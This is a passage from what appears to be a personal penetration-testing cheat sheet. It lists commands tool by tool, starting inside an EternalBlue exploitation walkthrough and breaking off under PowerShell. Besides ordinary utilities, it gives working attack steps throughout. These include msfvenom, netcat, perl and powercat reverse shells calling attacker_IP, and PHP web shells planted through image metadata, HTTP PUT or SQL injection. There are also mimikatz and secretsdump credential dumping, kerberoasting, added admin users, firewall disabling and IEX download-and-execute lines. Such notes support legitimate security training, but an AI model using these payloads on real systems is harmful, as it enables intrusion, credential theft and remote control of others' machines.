#check whether target is vulnerable
python checker.py IP_here

# eternalblue_exploit
## generate shellcode
ls -l MS17-010/shellcode/
### x64
#### assemble kernel shellcode
nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
#### generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP_here LPORT=port_here --platform windows -a x64 --format raw -o sc_x64_payload.bin
#### merge shellcode + payload
cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
### x86
#### assemble kernel shellcode
nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
#### generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP_here LPORT=port_here --platform windows -a x86 --format raw -o sc_x86_payload.bin
#### merge shellcode + payload
cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
### merge binaries (optional)
python MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin

## setup listener
rlwrap nc -lnvp port_here

## run exploit
python MS17-010/eternalblue_exploitversion_here.py target_IP_here /path/to/sc_all.bin

# zzz_exploit
## modify exploit : smb_pwn() 
### optional : comment out file creation
### create new user on target
service_exec(conn, r'cmd /c net user user_name_here password_here /add')
### elevate new user's privs
service_exec(conn, r'cmd /c net localgroup administrators user_name_here /add')
### optional : disable firewall
service_exec(conn, r'cmd /c netsh firewall set opmode disable')
service_exec(conn, r'cmd /c netsh advfirewall set allprofiles state off')
### write rev shell to disk on target
smb_send_file(smbConn, '/local/path/to/rev/shell', 'C', '/remote/path/to/rev/shell')
### execute rev shell
service_exec(conn, r'cmd /c C:\remote\path\to\rev\shell')

## setup listener
rlwrap nc -lnvp port_here

## run exploit
python MS17-010/zzz_exploit.py target_IP_here
```



## EVIL-WINRM
```bash
# get shell on IP_here as user
evil-winrm -i IP_here -u user -p password 
```



## EXE2HEX
```bash
# convert .exe to .cmd
exe2hex -x binary_here.exe -p binary_here.cmd
```



## EXIFTOOL
```bash
# add php web shell to image
exiftool -Comment='<?php system($_GET['cmd']); ?>' /path/to/image/here
# call shell
http://upload_url_here/file_name_here?cmd=command_here
```



## FFUF
```bash
# enumerate files
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ -e .txt,.php,.html

# filter out responses with a certain number of words
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ -fw number_here

# filter out responses with a certain size
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ -fs size_here

# filter out responses with a certain status code
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ -fc code_here

# read raw HTTP request from file
ffuf -w /path/to/wordlist.txt -request file_here

# fuzz with cookies (e.g. authentication)
ffuf -w /path/to/wordlist.txt -u http://URL_here/FUZZ -b "cookie_here=value_here; another_cookie_here=value_here"
```



## FIREFOX
```bash
# run google search from CLI
firefox --search "search_term_here"
```



## FLAMESHOT
```bash
# start flameshot
flameshot gui

# start flameshot with save path
flameshot gui -p /path/to/save

# capture with delay
flameshot gui -d ms_here

# capture full screen
flameshot full

# capture full screen + copy to clipboard
flameshot full -c

# change color
<right click>

# change line thickness
<scroll>
```



## FPING
```bash
# ping sweep
fping -a -g IP_range 2>/dev/null
```



## FSUTIL
```powershell
# list drives
fsutil fsinfo drives

# create new file
fsutil file createnew file_name_here file_size_here
```



## FTP
```bash
# connect
ftp IP_here

# connect in passive mode
ftp -p IP_here
pftp IP_here

# change into passive mode
quote PASV

# file upload
put /path/to/local/file [/path/remote]

# file download
get /path/to/remote/file

# bulk download files
binary
prompt OFF
mget *

# change to binary mode
binary

# rename file
rename old_file_name new_file_name

# non-interactive ftp session, read commands from file (1 line = 1 command)
ftp -v -n -s:file_here.txt

# transfer file Win / ftp client -> Lin / ftp server
## setup ftp server on Lin
mkdir ftphome
sudo systemctl start pure-ftpd
sudo systemctl restart pure-ftpd # id service already running

## prepare ftp commands on Win or interact with ftp prompt
echo open IP_here 21 > ftp_commands.txt
echo USER user_name_here >> ftp_commands.txt
echo password_here >> ftp_commands.txt
echo bin >> ftp_commands.txt
echo GET filename_here >> ftp_commands.txt
echo bye >> ftp_commands.txt

## start session on Win
ftp -v -n -s:ftp_commands.txt

```



## GCC
```
# get gcc version info
gcc -v

# cross-compile for 32-bit
gcc -m32 source.c -o outfile

# get gcc specs
gcc --dumpspecs
```



## GIT
```bash
# list branches
git branch

# create new branch
git checkout -b branch_name_here

# stash local changes, pull repo, pop local changes back 
git stash
git pull
git stash pop

# show commit history
git log
```



## GOBUSTER
```bash
# enumerate web folders
gobuster dir -u http://IP_here -w /path/to/wordlist.txt -o root-dir

# skip SSL certificate verfication
gobuster dir -u http://IP_here -w /path/to/wordlist.txt -k
```



## GO / GOLANG
```golang
# print line
import ("fmt")
fmt.Println("Print this line.")
const some_string = "some string here"
var some_other_string = "some other string"
fmt.Println("Printing ", some_string, "and ", some_other_string, ".")
```



## GOOGLE DORKS
```bash
# URL
inurl:(extension_here|other_extension_here)

# page title
intitle: "keyword_here" "other_keyword_here"

# hostname
site:www.domain.com
site:com

# file type
filetype:extension_here

# file extension
ext:extension_here

# logical operators
AND
OR
&
|

# filter out keyword
-keyword_here
```



## GPP-DECRYPT
```bash
# decrypt password from group policy preferences
gpp-decrypt ciphertext_here
```



## GREP
```bash
# grep recursively for search_term_here
grep -r search_term_here /path/to/search/directory

# grep for lines starting with search term
grep '^search_term_here'

# display x lines after search_term
grep -A x search_term_here

# display x lines before search_term
grep -B x search_term_here

# display x lines before and after search_term
grep -C x search_term_here

# ignore case
grep -i search_term_here

# select non-matching lines
grep -v search_term_here

# check whether login as root is permitted
grep PermitRootLogin /etc/ssh/sshd_config
```



## HASHCAT
```bash
# permute words in wordlist
hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# crack hash (with salt : append salt after hash in file : hash_here:salt_here)
hashcat -m hash_format_code_here /path/to/hash /path/to/wordlist
```



## HASHID
```bash
# identify hash type
hashid 'hash_here'
```



## HASKELL
```haskell
# setup project environment
stack new project_name_here simple
cd project_name_here
stack setup

# haskell shebang
#!/usr/bin/env stack

# start REPL
stack ghci

# start REPL with specific package
stack ghci --package package_name_here

# quit REPL
:quit

# load code from Main.hs in REPL
:load Main

# reload in REPL after changes
:r
:reload

# run main in REPL
main

# build executable
stack build

# run executable
stack exec project_name_here
```


## HDIUTIL
```bash
# attach .dmg
hdiutil attach /path/to/dmg
cd /path/to/volume

# detach .dmg
hdiutil detach /path/to/volume
```



## HOST
```bash
# find IP
host url_here

# find hostname
host IP_here domain_server_here

# request mail server for domain
host -t mx domain_here

# request name server for domain
host -t ns domain_here

# request text record for domain
host -t txt domain_here

# zone transfer
host -l domain_here name_server_here
```



## HTPASSWD
```bash
# generate apr1 hash (e.g. webdav)
htpasswd -nmb username_here password_here
```



## HYDRA
```bash
# dictionary attack
hydra -L users.txt -P passwords.txt <protocol://IP_here> <options>
hydra -l user_name_here -P /path/to/wordlist <protocol://IP_here> <options>

# dictionary attack - web form
hydra l user_name_here -p /path/to/wordlist url_here http-form-post "/path/to/login/form:user_name_param=^USER^&password_param=^PASS^&submit=Login:error_message_upon_failed_login_here"

# brute-force Oracle TNS listener password
hydra -P wordlist_here -t number_of_threads_here -s 1521 IP_here oracle-listener

# brute-force SIDs ORacle TNS listener password
hydra -L SID_wordlist_here -s 1521 IP_here oracle-sid
```



## IFCONFIG
```
# full path 
/usr/sbin/ifconfig -a
```



## IMPACKET
```bash
# get TGT for users with UF_DONT_REQUIRE_PREAUTH
/path/to/impacket/examples/GetNPUsers.py domain/ -usersfile /path/to/users.txt -no-pass -outputfile /path/to/tgt.txt

# dump secrets as user
/path/to/impacket-secretsdump -dc-ip IP_here user:password@IP_here

# dump hashes from SYSTEM, SAM, SECURITY registry files
/path/to/impacket-secretsdump -sam /path/to/copy/of/sam -system /path/to/copy/of/system -security /path/to/copy/of/security LOCAL

# kerberoasting : gather NTLM hashes
/path/to/impacket/examples/GetUserSPNs.py -request -dc-ip IP_here domain/user

# gather domain usernames
/path/to/impacket/GetADUsers.py -all -dc-ip IP_here domain/user

# get shell as user
/path/to/impacket/psexec.py domain/user@IP_here

# create public share for file transfer Win <--> Lin
## setup share on Lin
/path/to/impacket-smbserver share_name_here full_path_here
## mount share on Win
### powershell
New-PSDrive -Name "share_name_here_can_be_different_from_above" -PSProvider "FileSystem" -Root "\\Lin_IP_here\share_name_here"
### cmd
net use unused_letter_here: \\Lin_IP_here\share_name_here
## access drive
cd \\Lin_IP_here\share_name_here_can_be_different_from_above\
```



## IPCONFIG
```powershell
# read out local DNS cache
ipconfig /displaydns

# display full config
ipconfig /all

# purge DNS resolver cache
ipconfig /flushdns
```



## IPTABLES
```bash
# set all counters to zero
sudo iptables -Z

# insert new rule for allowed incoming traffic on top
sudo iptables -I INPUT 1 -s source_here -j ACCEPT

# insert new rule for allowed outgoing traffic on top
sudo iptables -I OUTPUT 1 -d destination_here -j ACCEPT

# list all rules
sudo iptables -L

# delete all rules
sudo iptables -F

# view traffic (by rule)
sudo iptables -nv -L
```



## JARSIGNER
```bash
# sign apk :
## generate private key
keytool -genkey -v -keystore keystore_here -alias alias_here -keyalg RSA -keysize 2048 -validity 7400
## sign
jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore keystore_here /path/to/apk alias_here

# verify signature
jarsigner -verify -verbose -certs /path/to/apk
```



## JOHN
```bash
# crack password hash - dictionary attack
john -w=/path/to/wordlist /path/to/hash

# crack password hash with mangling - dictionary attack
john -w=/path/to/wordlist --rules /path/to/hash

# crack password hash - brute-force attack
john -incremental -users:user_here /path/to/hash

# create mangled wordlist
john -w=/path/to/wordlist --rules --stdout > /path/to/mangled/outfile.txt

# unshadow
unshadow passwd_file shadow_file > output_file

# show cracked passwords
john --show /path/to/hash

# convert kdbx to john
keepass2john db_here.kdbx

# convert password protected rar to john
rar2john rar_here

# edit rules
## open conf file
sudo nano /etc/john/john.conf
## add rule description here
new_rule_here

# run multi-process john
john --fork=number_of_processes_here -w=/path/to/wordlist /path/to/hash
```



## JQ
```bash
# pretty print json file
cat /path/to/json | jq .
jq . /path/to/json

# extract attribute
cat /path/to/json | jq '.[].attribute_here'
jq '.[].attribute_here'

# convert content_attribute from json to pdf
jq -r '.[].content_attribute_here' /path/to/json | base64 -d >/path/to/pdf
```



## JUICY POTATO
```
# compile / download exe for arch + upload to victim via low priv shell
# generate new reverse shell + upload to victim
## x86
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x86 -o shell.exe
## x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe

# start listener on attacker machine
rlwrap nc -lnvp port_here

# call juicy potato
## x86
C:\path\to\Juicy.Potato.x86.exe -l port_here -p C:\path\to\rev\shell.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
## x64
C:\path\to\JuicyPotato.exe -l port_here -p C:\path\to\rev\shell.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
```



## KERBEROAST
```
# get users with Service Principal Names (SPNs)
GetUSerSPN.ps1

# Get service ticket
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestSecurityToken -ArgumentList "SPN_here"

# extract tickets
mimkatz # kerberos::list /export

# crack tickets
./tgsrepcrack.py /path/to/wordlist /path/to/kirbi
# convert kirbi to john
/path/to/kirbi2john.py /path/to/kirbi > out_file_here
# crack
john -w=/path/to/wordlist /path/to/john/file
```



## LDAP
```bash
# nmap script
nmap --script ldap-search IP_here 

ldapsearch -LLL -x -H ldap://IP_here -b '' -s base'(objectclass=*)'

ldapsearch -x -h IP_here -s sub -b 'dc=domain_here,dc=dc2_here'

# get domain name
ldapsearch -x -h IP_here -s base namingcontexts
```



## LINENUM
```bash
# activate thorough tests
/path/to/linenum.sh -t

# search keyword
/path/to/linenum.sh -k keyword_here

# copy interesting files to export folder
/path/to/linenum.sh -e export_folder_here
```



## LSE
```bash
# do not prompt for password
/path/to/lse.sh -i

# increase level of detail
/path/to/lse.sh -l 1 # relevant infor for priv esc
/path/to/lse.sh -l 2 # complete info dump
```



## MARKDOWN
```
# include images
![file_name_here](/path/to/image.png)

# include footnote
[^footnote_number_here]: [title_here](url_here)

# include url
[description_here](url_here)
```



## MEDUSA
```bash
# brute force login
medusa -h target_IP -u user_name_here -p password-here -M module_here -m module_param_here
medusa -h target_IP -U /path/to/user_name_list -P /path/to/wordlist -M module_here -m module_param_hereà

# list modules
medusa -d
```



## METERPRETER
```
# get cmd shell
shell

# get powershell shell
load powershell
powershell_shell
```



## MIMIKATZ
```powershell
# setup : start logging + enable SeDebugPrivilege (tamper with other processes)
log
privilege::debug

# priv esc from Administrator to SYSTEM via token impersonation (if mimikatz launched as Administrator)
token::elevate

# list available tokens (= logged in users)
token::list

# dump hashes from SAM
lsadump::sam

# dump secrets
lsadump::secrets

# ask DC to synchronize --> grab password for account
lsadump::dcsync /user:user_name_here

# dump credentials of logged-on users
sekurlsa::logonpasswords

# grab current user's tickets
sekurlsa::tickets

# get service ticket + write to disk (.kirbi)
kerberos::list /export

# list certificates
crypto::certificates
```



## MINGW
```
# cross-compile C for Windows on Linux - 32-bit
i686-w64-mingw32-gcc /path/to/source.c -o /path/to/out.exe

# cross-compile C for Windows on Linux - 64-bit
x86_64-w64-mingw32-gcc /path/to/source.c -o /path/to/out.exe

# cross-compile C++ for Windows on Linux - 32-bit
i686-w64-mingw32-g++ /path/to/source.c -o /path/to/out.exe

# cross-compile C++ for Windows on Linux - 64-bit
x86_64-w64-mingw32-g++ /path/to/source.c -o /path/to/out.exe
```



## MONA.PY
```python
# display modules + their memory protections
!mona modules

# find hex_opcode_here in module - e.h. \xff\xe4 = JMP ESP
!mona find -s "hex_opcode_here" -m dll_here
```



## MONGO
```sql
# connect to mongoDB database
mongo # connect to localhost
mongo IP_here
mongo IP_here/db_name_here
mongo IP_here:port_here
mongo IP_here:port_here/db_name_here
mongo -u user_here -p password_here IP_here:port_here/db_name_here

# list databases
show dbs

# use database
use db_name_here

# insert statement
db.collection_name_here.insert({"key":"value"})

# retrieve data
db.collection_name_here.find()
db.collection_name_here.find({"key":"value"})

# delete entry
db.collection_name_here.remove({"key":"value"})

# drop collection
db.collection_name_here.drop()

# drop database
db.dropDatabase()

# current database
db

# run system commands
run("command_here","arg_here")
```



## MSFCONSOLE
```bash
# import new exploit (Kali)
wget url_to_raw_ruby_exploit
cp ruby_exploit /usr/share/metasploit-framework/modules/exploits/path/to/fitting/category/exploit.rb
# exit msfconsole + restart

# import new exploit (install from git)
wget url_to_raw_ruby_exploit
cp ruby_exploit /opt/metasploit-framework/embedded/framework/modules/exploits/path/to/fitting/category/exploit.rb
# exit msfconsole + restart
```



## MSFVENOM
```bash
# list available payloads
msfvenom --list payloads

# create Windows TCP reverse shell exe - 64-bit (unstaged)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe

# create Windows TCP reverse shell exe - 32-bit (unstaged)
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x86 -o shell.exe

# create Windows TCP reverse shell asp (unstaged)
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f asp -o revshell.asp

# create Windows TCP reverse shell hta (unstaged)
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f hta-psh -o revshell.hta

# create Linux TCP reverse shell elf - 64-bit (unstaged)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f elf -a x64 -o shell.elf

# create Linux TCP reverse shell elf - 32-bit (unstaged)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f elf -a x86 -o shell.elf

# create TCP reverse shell jsp (unstaged)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f raw -o shell.jsp

# create TCP reverse shell as js shellcode (unstaged)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f js_le -e generic/none # Linux x64
msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f js_le -e generic/none # Linux x86
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f js_le -e generic/none # Windows
```



## MSF-NASM_SHELL
```bash
# find hex opcode for assembly instruction
msf-nasm_shell
assembly_instruction_here
```



## MSF-PATTERN_CREATE
```bash
# create unique pattern
msf-pattern_create -l length_here

#  create unique pattern from specific set : ABC, def, 123
msf-pattern_create -l length_here -s sets_here
```



## MSF-PATTERN_OFFSET
```bash
# locate EIP_bytes
msf-pattern_offset -l length_here -q EIP_bytes_here
```



## MSSQL
```sql
# connect to a db server as user
mssql -s IP_db_server -o port -u username -p password

# error-based SQLi with cast / convert
## numeric data
cast((SELECT @@version) as int)
convert(int,@@version)

## string
' + cast((SELECT @@version) as int) + '
' + convert(int,@@version) + '

## possible replacements for @@version
### database name
db_name() # current db
db_name(0) # current db
db_name(X) # X = 0,1,2,... list db names

### current user
user_name()
### table names
(select+top+1+table_name+from+information_schema.tables) # first table
(select+top+1+table_name+from+information_schema.tables+where+table_name+
    not+in+('first_table_name_here','second_table_name_here')) # subsequent tables
### column names
(select+top+1+column_name+from+information_schema.columns+where+table_name='table_name_here') # first column
(select+top+1+column_name+from+information_schema.columns+where+table_name='table_name_here'+and+column_name+not+in+('first_column_name_here')) # subsequent columns
```



## MYSQL / MARIADB
```sql
# start service
systemctl start mysql.service

# restart service
systemctl restart mysql.service

# stop service
systemctl stop mysql.service

# launch mysql as root
mysql -u root -p
sudo mysql -u root -p

# launch mysql with local database file
sudo mysql -u root -p db_name_here < local_file_here.sql

# launch mysql + execute command
mysql -u root -ppassword_here -e 'command here'

# connect to remote mysql instance
mysql -h IP_here -u root
mysql -h IP_here -u root@localhost

# create new database
create database db_name;

# list existing databases
show databases;

# enter database
use db_name;

# create new table + define columns
create table 'table_name' (column_name1 VARCHAR(20), username VARCHAR(8), email VARCHAR(35), password VARCHAR(25), [...]);

# list existing tables of current database
show tables;

# print out columns
describe table_name_here;

# spawn shell
\! bash
\! sh

# display user-defined functions
select * from mysql.func;

# read file
select load_file('/path/to/file/here');

# list all data from table
select * from 'table_name';

# create new user@localhost
create user 'username'@'localhost' identified by 'password';

# create new user@IP_here
create user 'username'@'IP_here' identified by 'password';

# create new user@IP_wildcard
create user 'username'@'%' identified by 'password';

# grant privileges to user@IP_here for every database
grant all privileges on *.* to 'username'@'IP_here' identified by 'password';

# grant privileges to user@IP_here for every table in db_name database
grant all privileges on 'db_name'.* to 'username'@'IP_here' identified by 'password';

# grant privileges to user@IP_here for table table_name in db_name database
grant all privileges on 'db_name'.'table_name' to 'username'@'IP_here' identified by 'password';

# show privileges for user
show grants for 'username'@'IP_here';

# apply changes to privileges
flush privileges;

# delete user
drop user 'username'@'IP_here';

# comment
#

# version
@@version

# current db user
user()
select user();

# information_schema : get tables
UNION all select 1,...,table_name from information_schema.tables

# information_schema : get table columns
UNION all select 1,...,column_name from information_schema.columns where table_name='table_name_here'

# file read
UNION all select 1,...,load_file('/path/to/file/here')

# write file in web root
UNION all select 1,...,"content_here" into OUTFILE '/path/to/outfile'

# write php shell in web root
UNION all select 1,...,"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/path/to/outfile'

# get shell via user-defined function (UDF) --> https://www.exploit-db.com/exploits/1518
## compile shared object / library
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
## connect to db
mysql -u root -p
## access mysql database
use mysql;
## create new table
create table foo(line blob);
## import library
insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
## write library to directory on path
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
## create UDF
create function do_system returns integer soname 'raptor_udf2.so';
## check import
select * from mysql.func;
## priv esc to root (if mysqld runs as root!)
select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
## spawn root shell
\! sh
\! bash
```



## NBTSCAN
```bash
# scan network for NBT
nbtscan -r target_range_here

# enumerate host
nbtscan -hv IP_here
nbtscan -r IP_here/32
```



## NETCAT
```bash
# establish connection
nc target_IP port_here
nc -v target_IP port_here
nc -nv target_IP port_here
## send CRLF, not only LF
nc -nvC target_IP port_here


# scan tcp port
nc -nvv -z -w time_out_in_seconds_here target_IP port_here

# scan udp port
nc -nvv -u -z -w time_out_in_seconds_here target_IP port_here

# start listener
nc -lnvp port_here

# transfer file (text + binary)
## listener
nc -lnvp port_here > /path/to/oufile
## sender
nc -nv listener_IP_here port_here < /path/to/file

# banner grabbing (2 empty lines required between headers + body!)
nc target_IP 80 -v
HEAD / HTTP/1.0



# enumerate allowed HTTP verbs
nc target_site 80 -v
OPTIONS / HTTP/1.0



# exploit DELETE
nc target_site 80 -v
DELETE /path/to/resource.txt HTTP/1.0



# exploit PUT with php web shell
nc target_site 80 -v
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 136

<?php
if (isset ($GET['cmd']))
{
$cmd = $_GET['cmd'];
echo '<pre>';
$result = shell_exec($cmd);
echo $result;
echo '</pre>';
}
?>

# bind shell to local port
nc -lnvp port_here -e cmd.exe
nc -lnvp port_here -e /bin/bash

# push reverse shell
nc -nv attacker_IP port_here -e cmd.exe
nc -nv attacker_IP port_here -e /bin/bash
nc -e cmd attacker_IP port_here
nc -e /bin/bash attacker_IP port_here
```



## NET
```powershell
# add new user
net user user_here password_here /add

# add new user to domain
net user user_here password_here /add /domain

# add user to group 
net group "group_name_here" /add user_here

# make user local admin
net localgroup administrators /add user_here

# show local admins
net localgroup administrators

# show domain admins
net localgroup administrators
net group "Domain Admins" /domain

# display user information
net user user_here /domain

# enumerate shares
net view IP_here

# enumerate domains available to host
net view /domain

# list hosts in current domain
net view

# list hosts in some_other_domain
net view /domain:some_other_domain_name_here

# show domain controllers for current domain
net group "Domain Controllers" /domain

# test for null session on share
net use \\IP_here\IPC$ '' /u:''

# stop service
net stop service_name_here

# (re)start service
net start service_name_here
```



## NIKTO
```bash
# scan host / site
nikto -h host_site_here

# scan host / site on port
nikto -h host_site_here -p port_here

# scan host / site with authentication
nikto -h host_site_here -i user_here:password_here
```



## NISHANG
```powershell
# prepare Nishang reverse shell
Invoke-PowerShellTcp -Reverse -IPAddress IP_here -Port port_here
```



## NMAP
```bash
# ping sweep
nmap -sn IP_range
nmap -sP IP_range
nmap -sn -iL IP_list_file_here

# scan IPv6
nmap -6 domain_here

# sweep network
nmap -p port_here target_range_here

# OS fingerprinting
nmap -Pn -O IP_here

# aggressive OS scan
nmap -Pn -O --osscan-guess IP_here

# gentle OS scan (limit detection to promising hosts)
nmap -Pn -O --osscan-limit IP_range

# TCP connection scan
nmap -sT target_here

# TCP SYN scan
nmap -sS target_here
nmap target_here

# TCP version scan (banner grabbing)
nmap -sV target_here

# run default scripts
nmap -sC target_here

# aggressive scan
nmap -A target_here

# UDP scan
nmap -sU target_here

# UDP + TCP SYN scan
nmap -sU -sS target_here

# possible target identifiers
nmap -some_scan DNS_here
nmap -some_scan IP_list_here
nmap -some_scan IP_with_wildcard_here
nmap -some_scan IP_range_list_here
nmap -some_scan CIDR_list_here
nmap -some_scan -iL IP_list_file_here

# more info on scan
nmap --reason -p port_here target_here

# show all available scripts
locate -r '\.nse$'

# show all available scripts with categories
locate -r '\.nse$' | xargs grep categories

# run some_script in debug mode
nmap --script some_script -p port_here IP_here -d

# show script help
nmap --script-help script_name_here

# update script DB
sudo nmap --script-updatedb

# run script with args
nmap --script some_script -p port_here IP_here --script-args "script_name_here.arg_name_here='arg_value_here', script_name_here.another_arg_name_here='arg_value_here'"

# check all available scripts for protocol
ls -1 /usr/share/nmap/scripts/protocol_here-*

# run all protocol scripts
nmap -p port_here --script protocol_here-* target_IP

# run all category (vuln, exploit) scripts
nmap --script category_here target_IP

# check supported HTTP methods
nmap -p 443 --script http-methods --script-args http-methods.url-path='/my/path/here' url_here

# quick vulnerability scan
nmap --script vuln IP_here
```



## NSLOOKUP
```bash
# find hostname of IP_here
nslookup
server DNS_IP_here
127.0.0.1
IP_here
```



## NTPDATE
```bash
# synchronize time of local machine with remote server
ntpdate remote_server_IP_here
```



## OBJDUMP
```bash
# disassemble binary
objdump -d /path/to/binary/here
```



## ODAT
```python
# run all modules, brute-force creds
/path/to/odap all -s IP_here -p 1521

# run all modules, known SID
/path/to/odat all -s IP_here -p 1521 -d SID_here

# run all modules, known creds
/path/to/odat all -s IP_here -p 1521 -d SID_here -U user_here -P password_here
```



## ONESIXTYONE
```bash
# brute force SNMP
onesixtyone -c community_strings_list_here -i IP_list_here
```



## OPENSSL
```bash
# banner grabbing http (2 empty lines required between headers + body!)
openssl s_client -connect target_IP:443
HEAD / HTTP/1.1



# banner / cert grabbing ftp
openssl s_client -connect target_IP:21 -starttls ftp

# genereate self-signed cert
openssl req -newkey rsa:2048 -nodes -keyout myprivkey.key -x509 -days 362 -out mycert.crt

# import client certificate
## extract .pem
openssl pkc12 -in certificate_name_here.pfx -nocerts -out certificate_name_here.pem -nodes
## extract .crt
openssl pkcs12 -in certificate_name_here.pfx -nokeys -out certificate_name_here.crt -nodes
## copy to /usr/local/share/ca-certificates/
sudo cp certificate_name_here.crt /usr/local/share/ca-certificates/certificate_name_here.crt
## update
sudo update-ca-certificates
```



## PANDOC
```bash
# convert markdown to pdf
pandoc -s -o out_file_here.pdf mardown_file_here.md
```



## PEAS
```bash
# WinPEAS
## add registry key
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
## reopen cmd
## run all checks
.\winPEASany.exe quiet cmd fast
```



## PERL
```perl
# generate string of 20 A + concatenate with ABCD
$(perl -e 'print "\x41" x 20 . "ABCD"')

# reverse shell
perl -e 'use Socket;$i="attacker_IP_here";$p=port_here;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# upgrade shell
perl -e 'exec "/bin/bash"'
```



## PHP
```php
# interactive mode
php -a

# define http request variables : parameter can be used in subsequent GET + POST requests
<?php system($_REQUEST['parameter_name_here']); ?>

# HTTP server
php -S 0.0.0.0:port_here

# data wrapper
data:text/plain,data_content_here

# execute commands
system()
shell_exec()
passthru()
```



## PIP & PIP3
```python
# install pip package
## PY2
python -m pip install package
pip install package
## PY3
python3 -m pip install package
pip3 install package

# install specific package version
## PY2
python -m pip install package==version_here
pip install package==version_here
## PY3
python3 -m pip install package==version_here
pip3 install package==version_here

# install requirements
pip install -r requirements.txt
```



## PIPREQS
```bash
# create requirements.txt
pipreqs

# force create requirements.txt
pipreqs --force
```



## PLINK
```powershell
# transfer plink.exe to victim, e.g. with certutil
# remote port forwarding from attacker_IP:listening_port to Windows box:service_port via SSH
cmd.exe /c echo y | plink.exe -ssh -l user_name_here -pw password_here -R attacker_IP_here:listening_port_here:127.0.0.1:service_port_here attacker_IP_here
```



## POP3
```bash
# connect
nc -nv IP_here 110
telnet IP_here 110
openssl s_client -connect IP_here:995 -quiet -crlf

# log in as user
USER user_name_here
PASS password_here

# show stats
STAT

# show server capabilities
CAPA

# list messages
LIST

# retrieve specific message
RETR id_here

# delete specific message
DELE id_here

# reset / undo changes
RSET

# head specific message
TOP msg id_here

# quit
QUIT
```



## POWERCAT
```powershell
# download powercat
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

# load powercat
. .\powercat.ps1

# transfer file
## listen
nc -lnvp port_here > /path/to/outfile
## send
powercat -c attacker_IP -p port_here -i C:\path\to\infile

# reverse shell
powercat -c attacker_IP -p port_here -e cmd.exe

# bind shell
powercat -l -p port_here -e cmd.exe

# generate stand-alone bind shell, base64-encoded
powercat -c attacker_IP -p port_here -e cmd.exe -ge > outfile.ps1
# run
powershell -E content_of_outfile.ps1
```



## POWERSHELL
```powershell
# execute commands via cmd
cmd.exe /c command_here

# print powershell version
echo $PSVersionTable

# print .NET version
cd C:\Windows\Microsoft.net\Franework64
dir
cd latest_v_folder_here
Get-Item clr.dll | fl
<google ProductVersion value>

# get execution policy
Get-ExecutionPolicy
Get-ExecutionPolicy -Scope CurrentUser

# set execution policy
Set-ExecutionPolicy Unrestricted
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# bypass execution policy (allow unsigned scripts)
powershell -ExecutionPolicy Bypass -File script_here.ps1

# import module
Import-Module module_name_here

# grep
Select-String -Path C:\path\here\*.extension_here -Pattern "string_here"

# grep recursively
Get-ChildItem C:\path\to\directory -Filter *.extension_here -Recurse | Select-String "string_here"

# find connections for specific service
netstat -anbo | Select-String service_name_here -Context 1

# search for a file
Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Include *.extension_here -File

# search for string in files in current directory + sub folders
Get_ChildItem . -Recurse | Select-String "string_here"

# download file from web server + run it 
IEX(IWR('http://URL_here/file_here'))
Invoke-WebRequest -Uri http://IP_here/path/to/file -OutFile /path/to/outfile

# download file from web server + run it without writing to disk
IEX/New-Object Net.WebClient().downloadString('http://IP_here/path/to/file')
IEX(New-Object Net.WebClient).downloadString('http://IP_here/path/to/file')

# transfer file
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://IP_here/file_here','C:\path\to\outfile')"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://IP_here/path/to/file', '/path/to/outfile')

# read text file
Get-Content file_name_here

# read alternate data stream
Get-Content file_name_here -Stream ads_name_here

# connect to share
